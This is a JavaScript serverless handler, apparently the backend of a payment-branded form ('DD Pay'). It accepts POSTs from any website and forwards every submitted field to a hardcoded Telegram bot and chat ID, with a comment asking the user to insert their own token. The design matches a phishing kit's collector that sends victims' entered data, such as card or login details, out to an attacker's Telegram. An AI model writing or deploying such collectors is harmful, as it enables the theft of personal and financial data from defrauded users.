export default async function handler(req, res) {
  // CORS allow
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Only POST' });
  }

  const BOT_TOKEN = '8606684305:AAF5PIx6f1v6Xv6Xv6Xv6Xv6Xv6Xv6X'; // yahan apna pura token daal
  const CHAT_ID = '7344589159';

  try {
    const body = req.body;
    let text = `🔥 DD Pay - Nayi Entry!\n\n`;
    
    // Sare fields ko message me jod de
    for (const key in body) {
      text += `${key}: ${body[key]}\n`;
    }
    text += `\nTime: ${new Date().toLocaleString('en-IN')}`;

    const telegramRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: text
      })
    });

    const result = await telegramRes.json();
    
    if (!result.ok) {
      return res.status(500).json({ error: 'Telegram fail', details: result });
    }

    return res.status(200).json({ success: true });
  } catch (e) {
    return res.status(500).json({ error: e.message });
  }
}
